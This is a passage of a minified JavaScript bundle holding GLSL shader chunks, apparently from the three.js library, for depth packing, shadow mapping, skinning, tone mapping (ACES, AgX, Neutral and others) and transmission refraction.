	if( v >= 1.0 )
		return vec2( 1., 1. );
	float vuf;
	float gf = modf( v * 256., vuf );
	return vec2( vuf * Inv255, gf );
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors4 );
}
float unpackRGBToDepth( const in vec3 v ) {
	return dot( v, UnpackFactors3 );
}
float unpackRGToDepth( const in vec2 v ) {
	return v.r * UnpackFactors2.r + v.g * UnpackFactors2.g;
}
vec4 pack2HalfToRGBA( const in vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( const in vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return depth * ( near - far ) - near;
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return ( near * far ) / ( ( far - near ) * depth - far );
}`,IE=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,UE=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,OE=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,FE=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,BE=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,zE=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,VE=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#else
			uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		#endif
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform sampler2DShadow spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#else
			uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		#endif
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#if defined( SHADOWMAP_TYPE_PCF )
			uniform samplerCubeShadow pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#elif defined( SHADOWMAP_TYPE_BASIC )
			uniform samplerCube pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		#endif
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float interleavedGradientNoise( vec2 position ) {
			return fract( 52.9829189 * fract( dot( position, vec2( 0.06711056, 0.00583715 ) ) ) );
		}
		vec2 vogelDiskSample( int sampleIndex, int samplesCount, float phi ) {
			const float goldenAngle = 2.399963229728653;
			float r = sqrt( ( float( sampleIndex ) + 0.5 ) / float( samplesCount ) );
			float theta = float( sampleIndex ) * goldenAngle + phi;
			return vec2( cos( theta ), sin( theta ) ) * r;
		}
	#endif
	#if defined( SHADOWMAP_TYPE_PCF )
		float getShadow( sampler2DShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
				float radius = shadowRadius * texelSize.x;
				float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
				shadow = (
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 0, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 1, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 2, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 3, 5, phi ) * radius, shadowCoord.z ) ) +
					texture( shadowMap, vec3( shadowCoord.xy + vogelDiskSample( 4, 5, phi ) * radius, shadowCoord.z ) )
				) * 0.2;
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#elif defined( SHADOWMAP_TYPE_VSM )
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				vec2 distribution = texture2D( shadowMap, shadowCoord.xy ).rg;
				float mean = distribution.x;
				float variance = distribution.y * distribution.y;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					float hard_shadow = step( mean, shadowCoord.z );
				#else
					float hard_shadow = step( shadowCoord.z, mean );
				#endif
				if ( hard_shadow == 1.0 ) {
					shadow = 1.0;
				} else {
					variance = max( variance, 0.0000001 );
					float d = shadowCoord.z - mean;
					float p_max = variance / ( variance + d * d );
					p_max = clamp( ( p_max - 0.3 ) / 0.65, 0.0, 1.0 );
					shadow = max( hard_shadow, p_max );
				}
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#else
		float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
			float shadow = 1.0;
			shadowCoord.xyz /= shadowCoord.w;
			shadowCoord.z += shadowBias;
			bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
			bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
			if ( frustumTest ) {
				float depth = texture2D( shadowMap, shadowCoord.xy ).r;
				#ifdef USE_REVERSED_DEPTH_BUFFER
					shadow = step( depth, shadowCoord.z );
				#else
					shadow = step( shadowCoord.z, depth );
				#endif
			}
			return mix( 1.0, shadow, shadowIntensity );
		}
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
	#if defined( SHADOWMAP_TYPE_PCF )
	float getPointShadow( samplerCubeShadow shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float texelSize = shadowRadius / shadowMapSize.x;
			vec3 absDir = abs( bd3D );
			vec3 tangent = absDir.x > absDir.z ? vec3( 0.0, 1.0, 0.0 ) : vec3( 1.0, 0.0, 0.0 );
			tangent = normalize( cross( bd3D, tangent ) );
			vec3 bitangent = cross( bd3D, tangent );
			float phi = interleavedGradientNoise( gl_FragCoord.xy ) * 6.28318530718;
			shadow = (
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 0, 5, phi ).x + bitangent * vogelDiskSample( 0, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 1, 5, phi ).x + bitangent * vogelDiskSample( 1, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 2, 5, phi ).x + bitangent * vogelDiskSample( 2, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 3, 5, phi ).x + bitangent * vogelDiskSample( 3, 5, phi ).y ) * texelSize, dp ) ) +
				texture( shadowMap, vec4( bd3D + ( tangent * vogelDiskSample( 4, 5, phi ).x + bitangent * vogelDiskSample( 4, 5, phi ).y ) * texelSize, dp ) )
			) * 0.2;
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#elif defined( SHADOWMAP_TYPE_BASIC )
	float getPointShadow( samplerCube shadowMap, vec2 shadowMapSize, float shadowIntensity, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		float shadow = 1.0;
		vec3 lightToPosition = shadowCoord.xyz;
		vec3 bd3D = normalize( lightToPosition );
		vec3 absVec = abs( lightToPosition );
		float viewSpaceZ = max( max( absVec.x, absVec.y ), absVec.z );
		if ( viewSpaceZ - shadowCameraFar <= 0.0 && viewSpaceZ - shadowCameraNear >= 0.0 ) {
			float dp = ( shadowCameraFar * ( viewSpaceZ - shadowCameraNear ) ) / ( viewSpaceZ * ( shadowCameraFar - shadowCameraNear ) );
			dp += shadowBias;
			float depth = textureCube( shadowMap, bd3D ).r;
			#ifdef USE_REVERSED_DEPTH_BUFFER
				shadow = step( depth, dp );
			#else
				shadow = step( dp, depth );
			#endif
		}
		return mix( 1.0, shadow, shadowIntensity );
	}
	#endif
	#endif
#endif`,HE=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowIntensity;
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
#endif`,GE=`#if ( defined( USE_SHADOWMAP ) && ( NUM_DIR_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0 ) ) || ( NUM_SPOT_LIGHT_COORDS > 0 )
	vec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
	vec4 shadowWorldPosition;
#endif
#if defined( USE_SHADOWMAP )
	#if NUM_DIR_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );
			vDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
			shadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );
			vPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;
		}
		#pragma unroll_loop_end
	#endif
#endif
#if NUM_SPOT_LIGHT_COORDS > 0
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_COORDS; i ++ ) {
		shadowWorldPosition = worldPosition;
		#if ( defined( USE_SHADOWMAP ) && UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
			shadowWorldPosition.xyz += shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias;
		#endif
		vSpotLightCoord[ i ] = spotLightMatrix[ i ] * shadowWorldPosition;
	}
	#pragma unroll_loop_end
#endif`,WE=`float getShadowMask() {
	float shadow = 1.0;
	#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {
		directionalLight = directionalLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowIntensity, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {
		spotLight = spotLightShadows[ i ];
		shadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowIntensity, spotLight.shadowBias, spotLight.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0 && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
	PointLightShadow pointLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {
		pointLight = pointLightShadows[ i ];
		shadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowIntensity, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;
	}
	#pragma unroll_loop_end
	#endif
	#endif
	return shadow;
}`,jE=`#ifdef USE_SKINNING
	mat4 boneMatX = getBoneMatrix( skinIndex.x );
	mat4 boneMatY = getBoneMatrix( skinIndex.y );
	mat4 boneMatZ = getBoneMatrix( skinIndex.z );
	mat4 boneMatW = getBoneMatrix( skinIndex.w );
#endif`,XE=`#ifdef USE_SKINNING
	uniform mat4 bindMatrix;
	uniform mat4 bindMatrixInverse;
	uniform highp sampler2D boneTexture;
	mat4 getBoneMatrix( const in float i ) {
		int size = textureSize( boneTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( boneTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( boneTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( boneTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( boneTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,qE=`#ifdef USE_SKINNING
	vec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );
	vec4 skinned = vec4( 0.0 );
	skinned += boneMatX * skinVertex * skinWeight.x;
	skinned += boneMatY * skinVertex * skinWeight.y;
	skinned += boneMatZ * skinVertex * skinWeight.z;
	skinned += boneMatW * skinVertex * skinWeight.w;
	transformed = ( bindMatrixInverse * skinned ).xyz;
#endif`,YE=`#ifdef USE_SKINNING
	mat4 skinMatrix = mat4( 0.0 );
	skinMatrix += skinWeight.x * boneMatX;
	skinMatrix += skinWeight.y * boneMatY;
	skinMatrix += skinWeight.z * boneMatZ;
	skinMatrix += skinWeight.w * boneMatW;
	skinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;
	objectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;
	#ifdef USE_TANGENT
		objectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;
	#endif
#endif`,$E=`float specularStrength;
#ifdef USE_SPECULARMAP
	vec4 texelSpecular = texture2D( specularMap, vSpecularMapUv );
	specularStrength = texelSpecular.r;
#else
	specularStrength = 1.0;
#endif`,KE=`#ifdef USE_SPECULARMAP
	uniform sampler2D specularMap;
#endif`,ZE=`#if defined( TONE_MAPPING )
	gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );
#endif`,JE=`#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
uniform float toneMappingExposure;
vec3 LinearToneMapping( vec3 color ) {
	return saturate( toneMappingExposure * color );
}
vec3 ReinhardToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	return saturate( color / ( vec3( 1.0 ) + color ) );
}
vec3 CineonToneMapping( vec3 color ) {
	color *= toneMappingExposure;
	color = max( vec3( 0.0 ), color - 0.004 );
	return pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );
}
vec3 RRTAndODTFit( vec3 v ) {
	vec3 a = v * ( v + 0.0245786 ) - 0.000090537;
	vec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;
	return a / b;
}
vec3 ACESFilmicToneMapping( vec3 color ) {
	const mat3 ACESInputMat = mat3(
		vec3( 0.59719, 0.07600, 0.02840 ),		vec3( 0.35458, 0.90834, 0.13383 ),
		vec3( 0.04823, 0.01566, 0.83777 )
	);
	const mat3 ACESOutputMat = mat3(
		vec3(  1.60475, -0.10208, -0.00327 ),		vec3( -0.53108,  1.10813, -0.07276 ),
		vec3( -0.07367, -0.00605,  1.07602 )
	);
	color *= toneMappingExposure / 0.6;
	color = ACESInputMat * color;
	color = RRTAndODTFit( color );
	color = ACESOutputMat * color;
	return saturate( color );
}
const mat3 LINEAR_REC2020_TO_LINEAR_SRGB = mat3(
	vec3( 1.6605, - 0.1246, - 0.0182 ),
	vec3( - 0.5876, 1.1329, - 0.1006 ),
	vec3( - 0.0728, - 0.0083, 1.1187 )
);
const mat3 LINEAR_SRGB_TO_LINEAR_REC2020 = mat3(
	vec3( 0.6274, 0.0691, 0.0164 ),
	vec3( 0.3293, 0.9195, 0.0880 ),
	vec3( 0.0433, 0.0113, 0.8956 )
);
vec3 agxDefaultContrastApprox( vec3 x ) {
	vec3 x2 = x * x;
	vec3 x4 = x2 * x2;
	return + 15.5 * x4 * x2
		- 40.14 * x4 * x
		+ 31.96 * x4
		- 6.868 * x2 * x
		+ 0.4298 * x2
		+ 0.1191 * x
		- 0.00232;
}
vec3 AgXToneMapping( vec3 color ) {
	const mat3 AgXInsetMatrix = mat3(
		vec3( 0.856627153315983, 0.137318972929847, 0.11189821299995 ),
		vec3( 0.0951212405381588, 0.761241990602591, 0.0767994186031903 ),
		vec3( 0.0482516061458583, 0.101439036467562, 0.811302368396859 )
	);
	const mat3 AgXOutsetMatrix = mat3(
		vec3( 1.1271005818144368, - 0.1413297634984383, - 0.14132976349843826 ),
		vec3( - 0.11060664309660323, 1.157823702216272, - 0.11060664309660294 ),
		vec3( - 0.016493938717834573, - 0.016493938717834257, 1.2519364065950405 )
	);
	const float AgxMinEv = - 12.47393;	const float AgxMaxEv = 4.026069;
	color *= toneMappingExposure;
	color = LINEAR_SRGB_TO_LINEAR_REC2020 * color;
	color = AgXInsetMatrix * color;
	color = max( color, 1e-10 );	color = log2( color );
	color = ( color - AgxMinEv ) / ( AgxMaxEv - AgxMinEv );
	color = clamp( color, 0.0, 1.0 );
	color = agxDefaultContrastApprox( color );
	color = AgXOutsetMatrix * color;
	color = pow( max( vec3( 0.0 ), color ), vec3( 2.2 ) );
	color = LINEAR_REC2020_TO_LINEAR_SRGB * color;
	color = clamp( color, 0.0, 1.0 );
	return color;
}
vec3 NeutralToneMapping( vec3 color ) {
	const float StartCompression = 0.8 - 0.04;
	const float Desaturation = 0.15;
	color *= toneMappingExposure;
	float x = min( color.r, min( color.g, color.b ) );
	float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
	color -= offset;
	float peak = max( color.r, max( color.g, color.b ) );
	if ( peak < StartCompression ) return color;
	float d = 1. - StartCompression;
	float newPeak = 1. - d * d / ( peak + d - StartCompression );
	color *= newPeak / peak;
	float g = 1. - 1. / ( Desaturation * ( peak - newPeak ) + 1. );
	return mix( color, vec3( newPeak ), g );
}
vec3 CustomToneMapping( vec3 color ) { return color; }`,QE=`#ifdef USE_TRANSMISSION
	material.transmission = transmission;
	material.transmissionAlpha = 1.0;
	material.thickness = thickness;
	material.attenuationDistance = attenuationDistance;
	material.attenuationColor = attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		material.transmission *= texture2D( transmissionMap, vTransmissionMapUv ).r;
	#endif
	#ifdef USE_THICKNESSMAP
		material.thickness *= texture2D( thicknessMap, vThicknessMapUv ).g;
	#endif
	vec3 pos = vWorldPosition;
	vec3 v = normalize( cameraPosition - pos );
	vec3 n = inverseTransformDirection( normal, viewMatrix );
	vec4 transmitted = getIBLVolumeRefraction(
		n, v, material.roughness, material.diffuseContribution, material.specularColorBlended, material.specularF90,
		pos, modelMatrix, viewMatrix, projectionMatrix, material.dispersion, material.ior, material.thickness,
		material.attenuationColor, material.attenuationDistance );
	material.transmissionAlpha = mix( material.transmissionAlpha, transmitted.a, material.transmission );
	totalDiffuse = mix( totalDiffuse, transmitted.rgb, material.transmission );
#endif`,e1=`#ifdef USE_TRANSMISSION
	uniform float transmission;
	uniform float thickness;
	uniform float attenuationDistance;
	uniform vec3 attenuationColor;
	#ifdef USE_TRANSMISSIONMAP
		uniform sampler2D transmissionMap;
	#endif
	#ifdef USE_THICKNESSMAP
		uniform sampler2D thicknessMap;
	#endif
	uniform vec2 transmissionSamplerSize;
	uniform sampler2D transmissionSamplerMap;
	uniform mat4 modelMatrix;
	uniform mat4 projectionMatrix;
	varying vec3 vWorldPosition;
	float w0( float a ) {
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - a + 3.0 ) - 3.0 ) + 1.0 );
	}
	float w1( float a ) {
		return ( 1.0 / 6.0 ) * ( a *  a * ( 3.0 * a - 6.0 ) + 4.0 );
	}
	float w2( float a ){
		return ( 1.0 / 6.0 ) * ( a * ( a * ( - 3.0 * a + 3.0 ) + 3.0 ) + 1.0 );
	}
	float w3( float a ) {
		return ( 1.0 / 6.0 ) * ( a * a * a );
	}
	float g0( float a ) {
		return w0( a ) + w1( a );
	}
	float g1( float a ) {
		return w2( a ) + w3( a );
	}
	float h0( float a ) {
		return - 1.0 + w1( a ) / ( w0( a ) + w1( a ) );
	}
	float h1( float a ) {
		return 1.0 + w3( a ) / ( w2( a ) + w3( a ) );
	}
	vec4 bicubic( sampler2D tex, vec2 uv, vec4 texelSize, float lod ) {
		uv = uv * texelSize.zw + 0.5;
		vec2 iuv = floor( uv );
		vec2 fuv = fract( uv );
		float g0x = g0( fuv.x );
		float g1x = g1( fuv.x );
		float h0x = h0( fuv.x );
		float h1x = h1( fuv.x );
		float h0y = h0( fuv.y );
		float h1y = h1( fuv.y );
		vec2 p0 = ( vec2( iuv.x + h0x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p1 = ( vec2( iuv.x + h1x, iuv.y + h0y ) - 0.5 ) * texelSize.xy;
		vec2 p2 = ( vec2( iuv.x + h0x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		vec2 p3 = ( vec2( iuv.x + h1x, iuv.y + h1y ) - 0.5 ) * texelSize.xy;
		return g0( fuv.y ) * ( g0x * textureLod( tex, p0, lod ) + g1x * textureLod( tex, p1, lod ) ) +
			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float dispersion, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec4 transmittedLight;
		vec3 transmittance;
		#ifdef USE_DISPERSION
			float halfSpread = ( ior - 1.0 ) * 0.025 * dispersion;
			vec3 iors = vec3( ior - halfSpread, ior, ior + halfSpread );
			for ( int i = 0; i < 3; i ++ ) {
				vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, iors[ i ], modelMatrix );
				vec3 refractedRayExit = position + transmissionRay;
				vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
				vec2 refractionCoords = ndcPos.xy / ndcPos.w;
				refractionCoords += 1.0;
				refractionCoords /= 2.0;
				vec4 transmissionSample = getTransmissionSample( refractionCoords, roughness, iors[ i ] );
				transmittedLight[ i ] = transmissionSample[ i ];
				transmittedLight.a += transmissionSample.a;
				transmittance[ i ] = diffuseColor[ i ] * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance )[ i ];
			}
			transmittedLight.a /= 3.0;
		#else
			vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
			vec3 refractedRayExit = position + transmissionRay;
			vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
			vec2 refractionCoords = ndcPos.xy / ndcPos.w;
			refractionCoords += 1.0;
			refractionCoords /= 2.0;
			transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
			transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		#endif
